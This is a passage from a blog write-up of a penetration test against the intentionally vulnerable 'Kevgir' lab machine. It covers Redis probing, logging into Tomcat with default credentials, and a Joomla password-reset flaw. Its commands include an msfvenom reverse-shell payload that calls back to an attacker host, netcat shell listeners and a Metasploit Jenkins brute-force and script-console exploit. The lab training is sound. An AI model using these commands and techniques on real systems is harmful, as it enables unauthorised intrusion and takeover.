  &mdash;rdb <filename>   Transfer an RDB dump from remote server to local file.
  &mdash;pipe             Transfer raw Redis protocol from stdin to server.
  &mdash;pipe-timeout <n> In &mdash;pipe mode, abort with error if after sending all data.</p>

<pre><code>                 no reply is received within &lt;n&gt; seconds.
                 Default timeout: 30. Use 0 to wait forever.
</code></pre>

<p>  &mdash;bigkeys          Sample Redis keys looking for big keys.
  &mdash;scan             List all keys using the SCAN command.
  &mdash;pattern <pat>    Useful with &mdash;scan to specify a SCAN pattern.
  &mdash;intrinsic-latency <sec> Run a test to measure intrinsic system latency.</p>

<pre><code>                 The test will run for the specified amount of seconds.
</code></pre>

<p>  &mdash;eval <file>      Send an EVAL command using the Lua script at <file>.
  &mdash;ldb              Used with &mdash;eval enable the Redis Lua debugger.
  &mdash;ldb-sync-mode    Like &mdash;ldb but uses the synchronous Lua debugger, in</p>

<pre><code>                 this mode the server is blocked and script changes are
                 are not rolled back from the server memory.
</code></pre>

<p>  &mdash;help             Output this help and exit.
  &mdash;version          Output version and exit.</p>

<p>Examples:
  cat /etc/passwd | redis-cli -x set mypasswd
  redis-cli get mypasswd
  redis-cli -r 100 lpush mylist x
  redis-cli -r 100 -i 1 info | grep used_memory_human:
  redis-cli &mdash;eval myscript.lua key1 key2 , arg1 arg2 arg3
  redis-cli &mdash;scan &mdash;pattern &lsquo;<em>:12345</em>&rsquo;</p>

<p>  (Note: when using &mdash;eval the comma separates KEYS[] from ARGV[] items)</p>

<p>When no command is given, redis-cli starts in interactive mode.
Type &ldquo;help&rdquo; in interactive mode for information on available commands
and settings.
```</p>

<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>

<p>```
redis-cli -h 192.168.217.128
192.168.217.128:6379> help
redis-cli 4.0.2
To get help about Redis commands type:</p>

<pre><code>  "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
  "help &lt;command&gt;" for help on &lt;command&gt;
  "help &lt;tab&gt;" to get a list of possible help topics
  "quit" to exit
</code></pre>

<p>To set redis-cli preferences:</p>

<pre><code>  ":set hints" enable online hints
  ":set nohints" disable online hints
</code></pre>

<p>Set your preferences in ~/.redisclirc
192.168.217.128:6379> info</p>

<h1>Server</h1>

<p>redis_version:3.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:aa70bcb321ba8313
redis_mode:standalone
os:Linux 3.19.0-25-generic i686
arch_bits:32
multiplexing_api:epoll
gcc_version:4.8.4
process_id:1263
run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
tcp_port:6379
uptime_in_seconds:3235
uptime_in_days:0
hz:10
lru_clock:2368010
config_file:/etc/redis/6379.conf</p>

<h1>Clients</h1>

<p>connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0</p>

<h1>Memory</h1>

<p>used_memory:637624
used_memory_human:622.68K
used_memory_rss:8929280
used_memory_peak:637624
used_memory_peak_human:622.68K
used_memory_lua:24576
mem_fragmentation_ratio:14.00
mem_allocator:jemalloc-3.6.0</p>

<h1>Persistence</h1>

<p>loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1512314215
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok</p>

<h1>Stats</h1>

<p>total_connections_received:2
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:41
total_net_output_bytes:6067614
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0</p>

<h1>Replication</h1>

<p>role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0</p>

<h1>CPU</h1>

<p>used_cpu_sys:3.71
used_cpu_user:1.60
used_cpu_sys_children:0.00
used_cpu_user_children:0.00</p>

<h1>Cluster</h1>

<p>cluster_enabled:0</p>

<h1>Keyspace</h1>

<p>192.168.217.128:6379>
```</p>

<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>

<h2>Tomcat default credentials</h2>

<p><code>
PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
</code></p>

<p>Time to look at that Tomcat server!</p>

<p>```
nikto -h <a href="http://192.168.217.128:8080/">http://192.168.217.128:8080/</a></p>

<h2>&ndash; Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.217.128</li>
<li>Target Hostname:    192.168.217.128</li>
<li>Target Port:        8080

<ul>
<li>Start Time:         2017-12-03 12:21:45 (GMT-5)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache-Coyote/1.1</li>
<li>Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
<li>Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS</li>
<li>OSVDB-397: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;PUT&rsquo; method could allow clients to save files on the web server.</li>
<li>OSVDB-5646: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;DELETE&rsquo; may allow clients to remove files on the web server.</li>
<li>/: Appears to be a default Apache Tomcat install.</li>
<li>/examples/servlets/index.html: Apache Tomcat default JSP pages present.</li>
<li>OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.</li>
<li>Default account found for &lsquo;Tomcat Manager Application&rsquo; at /manager/html (ID &lsquo;tomcat&rsquo;, PW &lsquo;tomcat&rsquo;). Apache Tomcat.</li>
<li>/manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
<li>/host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
<li>/manager/status: Tomcat Server Status interface found (pass protected)</li>
<li>7661 requests: 0 error(s) and 14 item(s) reported on remote host

<ul>
<li>End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
```</li>
</ul>


<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>

<p><img class="center" src="/images/pentest/kevgir/manager-fullpage.png" title="&lsquo;manager&rsquo; &lsquo;tomcat web application manager&rsquo;" ></p>

<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>

<p><code>
msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: runme.war
</code></p>

<p>Check what&rsquo;s inside:</p>

<p><code>
jar -tf runme.war
WEB-INF/
WEB-INF/web.xml
kndeoavjwgjs.jsp
</code></p>

<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
whoami
tomcat7
</code></p>

<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>

<h2>Joomla</h2>

<p><code>
PORT      STATE SERVICE     VERSION
8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-robots.txt: 14 disallowed entries
| /administrator/ /cache/ /components/ /images/
| /includes/ /installation/ /language/ /libraries/ /media/
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to the Frontpage
</code></p>

<p><img class="center" src="/images/pentest/kevgir/8081.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>

<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>

<p>```
* The Exact version found is 1.5.1</p>

<h1>15</h1>

<p>Info &ndash;> CoreComponent: Joomla Remote Admin Password Change Vulnerability
Versions Affected: 1.5.5 &lt;=
Check: /components/com_user/controller.php
Exploit: 1. Go to url : target.com/index.php?option=com_user&amp;view=reset&amp;layout=confirm  2. Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password
Vulnerable? Yes
```</p>

<p>This vulnerability is tracked under CVE-2008-3681:</p>

<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>

<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>

<p><img class="center" src="/images/pentest/kevgir/token.jpg" title="&lsquo;token&rsquo; &lsquo;password reset bypass&rsquo;" ></p>

<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>

<p><img class="center" src="/images/pentest/kevgir/joomla.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>

<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>

<p><img class="center" src="/images/pentest/kevgir/template.jpg" title="&lsquo;template&rsquo; &lsquo;joomla template&rsquo;" ></p>

<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
</code></p>

<h2>Jenkins</h2>

<p><code>
PORT      STATE SERVICE     VERSION
9000/tcp  open  http        Jetty winstone-2.9
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(winstone-2.9)
|_http-title: Dashboard [Jenkins]
</code></p>

<p><img class="center" src="/images/pentest/kevgir/jenkins.jpg" title="&lsquo;jenkins&rsquo; &lsquo;jenkins dashboard&rsquo;" ></p>

<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>

<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
tasks related to building, testing, and delivering or deploying software.</p></blockquote>

<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>

<p>```
msf auxiliary(jenkins_enum) > info</p>

<pre><code>   Name: Jenkins-CI Enumeration
 Module: auxiliary/scanner/http/jenkins_enum
License: Metasploit Framework License (BSD)
   Rank: Normal
</code></pre>

<p>Provided by:
  Jeff McCutchan</p>

<p>Basic options:
  Name       Current Setting  Required  Description</p>

<hr />

<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host</p>

<p>Description:
  This module enumerates a remote Jenkins-CI installation in an
  unauthenticated manner, including host operating system and Jenkins
  installation details.
```</p>

<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>

<p>```
msf auxiliary(jenkins_enum) > exploit</p>

<p>[+] 192.168.217.128:9000  &ndash; Jenkins Version 1.647
[<em>] /script restricted (403)
[</em>] /view/All/newJob restricted (403)
[+] <a href="http://192.168.217.128:9000/">http://192.168.217.128:9000/</a> &ndash; /asynchPeople/ does not require authentication (200)
[*] /systemInfo restricted (403)
```</p>

<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>

<p><img class="center" src="/images/pentest/kevgir/jenkins-admin.jpg" title="&lsquo;jenkins admin&rsquo; &lsquo;jenkins admin&rsquo;" ></p>

<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>

<p>```
Module options (auxiliary/scanner/http/jenkins_login):</p>

<p>   Name              Current Setting                                     Required  Description</p>

<hr />

<p>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
   PASSWORD                                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
   RPORT             9000                                                yes       The target port (TCP)
   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
   THREADS           1                                                   yes       The number of concurrent threads
   USERNAME          admin                                               no        A specific username to authenticate as
   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                               no        Try the username as the password for all users
   USER_FILE                                                             no        File containing usernames, one per line
   VERBOSE           true                                                yes       Whether to print output for all attempts
   VHOST                                                                 no        HTTP server virtual host
```</p>

<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>

<p><code>
[+] 192.168.217.128:9000 - Login Successful: admin:hello
</code></p>

<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>

<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>

<p>Don&rsquo;t forget to select the target as Linux:</p>

<p>```
options</p>

<p>Module options (exploit/multi/http/jenkins_script_console):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   API_TOKEN                   no        The API token for the specified username
   PASSWORD   hello            no        The password for the specified username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOST      192.168.217.128  yes       The target address
   RPORT      9000             yes       The target port (TCP)
   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path to the Jenkins-CI application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            no        The username to authenticate as
   VHOST                       no        HTTP server virtual host</p>

<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST  192.168.217.132  yes       The listen address
   LPORT  8080             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   1   Linux
```</p>

<p>And a new shell appears!</p>

<p>```
msf exploit(jenkins_script_console) > exploit</p>

<p>[<em>] Started reverse TCP handler on 192.168.217.132:8080
[</em>] Checking access to the script console
[<em>] Logging in&hellip;
[</em>] 192.168.217.128:9000 &ndash; Sending Linux stager&hellip;
[<em>] Sending stage (849108 bytes) to 192.168.217.128
[</em>] Meterpreter session 1 opened (192.168.217.132:8080 &ndash;> 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500</p>

<p>meterpreter >
[!] Deleting /tmp/wE472W payload file
```</p>

<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>

<p><code>
PORT      STATE SERVICE     VERSION
46201/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequest:
|     Unrecognized protocol:
|   DNSVersionBindReq:
|     Unrecognized protocol:
|     version
|_    bind
53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
</code></p>

<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>

<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
TCP/IP and UDP/IP via Java NIO.</p></blockquote>

<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>

<h3>Learn more</h3>

<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>

<p>```</p>

<hr />

<p>/ This will be a memorable month &mdash; no  \
\ matter how hard you try to forget it. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
